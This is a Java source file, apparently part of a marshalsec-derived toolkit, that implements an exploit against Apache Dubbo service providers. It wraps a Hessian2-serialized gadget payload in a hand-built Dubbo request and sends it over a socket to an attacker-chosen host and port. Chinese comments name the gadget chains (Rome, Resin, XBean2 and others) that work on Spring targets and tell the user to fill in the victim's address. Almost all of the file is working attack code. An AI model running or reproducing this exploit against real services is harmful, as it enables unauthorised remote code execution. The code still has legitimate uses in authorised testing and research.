/* MIT License

Copyright (c) 2017 Moritz Bechler

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/
package marshalsec;


import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.util.HashMap;
import java.util.Random;
import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.Cleanable;
import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;

/**
 * 暂时测试Spring、Spring-boot环境可打的有 Rome, Resin, SpringAbstractBeanFactoryPointcutAdvisor
 * 能打Spring环境的有 Rome, XBean2, Resin
 *
 * @author threedr3am
 */
public class DubboHessian extends Hessian2 {

  private String host;
  private int port;

  public DubboHessian(String[] args) {
    int argoff = 0;

    while (argoff < args.length && args[argoff].charAt(0) == '-') {
      if (args[argoff].equals("--attack")) {
        argoff++;
        host = args[argoff++];
        port = Integer.parseInt(args[argoff++]);
      } else {
        argoff++;
      }
    }
  }

  private void attack(byte[] bytes) throws IOException {
    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
    // header.
    byte[] header = new byte[16];
    // set magic number.
    Bytes.short2bytes((short) 0xdabb, header);
    // set request and serialization flag.
    header[2] = (byte) ((byte) 0x80 | 2);

    // set request id.
    Bytes.long2bytes(new Random().nextInt(100000000), header, 4);

    ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
    ByteArrayOutputStream hessian2ByteArrayOutputStream2 = new ByteArrayOutputStream();
    ByteArrayOutputStream hessian2ByteArrayOutputStream3 = new ByteArrayOutputStream();
    Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);
    Hessian2ObjectOutput out3 = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream3);

    out.writeUTF("2.0.2");
    //todo 此处填写注册中心获取到的service全限定名、版本号、方法名
    out.writeUTF("com.threedr3am.learn.server.boot.DemoService");
//    out.writeUTF("com.threedr3am.learn.dubbo.DemoService");
    out.writeUTF("1.0");
    out.writeUTF("hello");
    //todo 方法描述不需要修改，因为此处需要指定map的payload去触发
    out.writeUTF("Ljava/util/Map;");
    out.flushBuffer();
    if (out instanceof Cleanable) {
      ((Cleanable) out).cleanup();
    }

    hessian2ByteArrayOutputStream2.write(bytes);
//    out.writeObject(o);
    out3.writeObject(new HashMap());

    out3.flushBuffer();
    if (out3 instanceof Cleanable) {
      ((Cleanable) out3).cleanup();
    }

    Bytes.int2bytes(hessian2ByteArrayOutputStream.size() + hessian2ByteArrayOutputStream2.size() + hessian2ByteArrayOutputStream3.size(), header, 12);
    byteArrayOutputStream.write(header);
    byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());
    byteArrayOutputStream.write(hessian2ByteArrayOutputStream2.toByteArray());
    byteArrayOutputStream.write(hessian2ByteArrayOutputStream3.toByteArray());

    byte[] poc = byteArrayOutputStream.toByteArray();

    //todo 此处填写被攻击的dubbo服务提供者地址和端口
    Socket socket = new Socket(host, port);
    OutputStream outputStream = socket.getOutputStream();
    outputStream.write(poc);
    outputStream.flush();
    outputStream.close();
  }

  @Override
  public byte[] marshal(Object o) throws Exception {
    byte[] bytes = super.marshal(o);
    attack(bytes);
    return bytes;
  }

  @Override
  public Object unmarshal(byte[] data) throws Exception {
    return super.unmarshal(data);
  }

  public static void main(String[] args) {
    new DubboHessian(args).run(args);
  }

}
